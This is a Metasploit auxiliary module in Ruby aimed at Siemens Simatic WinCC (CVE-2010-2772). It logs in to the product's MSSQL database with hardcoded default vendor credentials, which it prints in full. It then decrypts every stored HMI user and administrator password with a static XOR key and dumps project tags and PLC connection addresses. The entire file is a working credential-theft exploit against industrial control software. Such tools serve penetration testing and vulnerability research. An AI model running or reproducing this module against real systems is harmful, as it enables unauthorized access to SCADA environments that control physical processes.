##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::MSSQL
	include Msf::Auxiliary::Report

	def initialize(info = {})
	super(update_info(info,
		'Name'		=> 'Simatic WinCC Until 7.0 SP3 Update2 Information Gathering',
		'Description'	=> 'This module allows remote attackers to get HMI users passwords on
				the affected system via MSSQL using default logins/passwords:
				WinCCAdmin/2WSXcde.
				WinCCConnect/2WSXcder',
		'License' => MSF_LICENSE,
		'Author'  => [
			'Dmitry Nagibin <DNagibin[at]ptsecurity.com>',    # Initial discovery/PoC
			'Gleb Gritsai <ggritsai[at]ptsecurity.com>',      # Initial discovery/PoC
			'Vyacheslav Egoshin <vegoshin[at]ptsecurity.com>' # msf
		],
		'References' =>
			[
				[ 'CVE', '2010-2772'],
				['OSVDB', '66441'],
				[ 'BID', '41753'],
				[ 'URL', 'http://www.slideshare.net/qqlan/positive-technologies-s4-scada-under-xrays'],
			],
		'DefaultOptions' =>
			{
				'USERNAME' => 'WinCCConnect',
				'PASSWORD' => '2WSXcder'
			},
		'DisclosureDate' => 'Jun 03 2012'))
	end

	def decrypt(username, hash)
		# static
		key = "This is my encryptionkey"
		# convert string to ascii array
		ascii = -> str { str .scan(/./)  .map{|c|c.ord} }
		# convert hex string to array
		hex = -> num { num .scan(/../) .map{|n|n.to_i 16 if n.to_i>0} }
		key, hash = ascii.(key), hex.(hash)

		# complements an array of zeroes element
		username = ascii.(username.upcase) + [0] * (key.size - ascii.(username).size)
		# delete spaces from ascii key array
		hash.delete(32)
		# xor each symbol key and hash
		xor_key_user  = key.zip(hash) .reject{|i| i[1].nil? } .map{|x| x[0]^x[1]}
		# xor previous step with username
		xor_password = xor_key_user.zip(username) .map{|x| x[0]^x[1]}
		# get password characters
		xor_password.select! {|sym| sym > 18} .map! { |sym| sym.chr}

		xor_password.join
	end

	def run
		# try connect to DB
		if mssql_login_datastore
			# get db
			project_databases_names = db_query("SELECT name FROM master..sysdatabases WHERE name LIKE 'CC%_[0-9]'")
			get_info(project_databases_names)
		else
			print_error "Can't connect to the database"
		end
	end

	def db_query(query, verbose = false, only_rows = true)
		# query MSSQL DB
		result = mssql_query(query, verbose)
		if !result[:errors].empty?
			print_error "Error: #{result[:errors]}"
			print_error "Error query: #{query}"
		else
			only_rows ? result[:rows] : result
		end
	end

	def print_table columns, rows, header = ''
		# print output table
		tbl = Rex::Ui::Text::Table.new(
			'Indent'        => 4,
			'Header'        => header,
			'Columns'       => columns
		)

		unless rows.nil?
			rows.each do |row|
				tbl << row
			end
			print_line tbl.to_s
		end
	end

	def get_info(dbs)
		prj ={}
		dbs.map do |db|
			# get db name
			db = db.first
			prj[db] = {}
			prj[db]["name"] = db_query("SELECT DSN FROM #{db}.dbo.CC_CsSysInfoLog")

			prj[db]["admins"] = db_query("SELECT NAME,
				convert(varbinary, PASS) as PWD
				FROM #{db}.dbo.PW_USER
				WHERE PASS <> '' and GRPID = 1000")

			# decrypt admin password
			prj[db]["admins"] = prj[db]["admins"].map do |usr|
				usr_pass = decrypt usr[0].strip,usr[1]
				usr.insert(2,usr_pass)
			end

			prj[db]["users"] = db_query("SELECT ID, NAME, convert(varbinary, PASS), GRPID
				FROM #{db}.[dbo].[PW_USER]
				WHERE PASS <> '' and GRPID <> 1000")

			# decrypt user password
			prj[db]["users"] = prj[db]["users"].map do |usr|
				usr_pass = decrypt usr[1].strip,usr[2]
				usr.insert(3,usr_pass)
			end

			prj[db]["tags"] = db_query("SELECT VARNAME,VARTYP,COMMENTS FROM #{db}.[dbo].[PDE#TAGs]")
			prj[db]["groups"] = db_query("SELECT ID, NAME FROM #{db}.[dbo].[PW_USER] WHERE PASS = ''")

			prj[db]["plcs"] = db_query("SELECT CONNECTIONNAME, PARAMETER FROM #{db}.[dbo].[MCPTCONNECTION]")

			# get PLC IP
			prj[db]["plcs"] = prj[db]["plcs"].map do |name, ip|
				real_ip = ip
				# if ip notation found
				real_ip = ip.scan(/\d+\.\d+\.\d+\.\d+/).first if ip =~ /\d+\.\d+\.\d+\.\d+/
				[name, real_ip]
			end

			# print project name
			print_good "Project: #{prj[db]["name"].first.first}\n"
			# print fields, data, header
			print_table %w|ID NAME|, prj[db]["groups"], "WinCC groups"
			print_table %w|Name Password(hex) Password(text)|, prj[db]["admins"], "WinCC administrator"
			print_table %w|ID NAME Password(hex) Password(text) GRPID|, prj[db]["users"], "WinCC users"
			print_table %w|VARNAME VARTYP COMMENTS|, prj[db]["tags"], "WinCC tags"
			print_table %w|CONNECTIONNAME PARAMETER|, prj[db]["plcs"], "WinCC PLCs"

			prj[db]["admins"].map do |usr|
				report_auth_info(
					:host => "1.2.3.4",
					:port => datastore['RPORT'],
					:sname => 'HMI User',
					:user => usr[0].strip,
					:pass => usr[2],
					:source_type => "captured",
					:active => true
				)
			end

			prj[db]["users"].map do |usr|
				report_auth_info(
					:host => "1.2.3.4",
					:port => datastore['RPORT'],
					:sname => 'HMI User',
					:user => usr[1].strip,
					:pass => usr[3],
					:source_type => "captured",
					:active => true
				)
			end

		end
	end

end

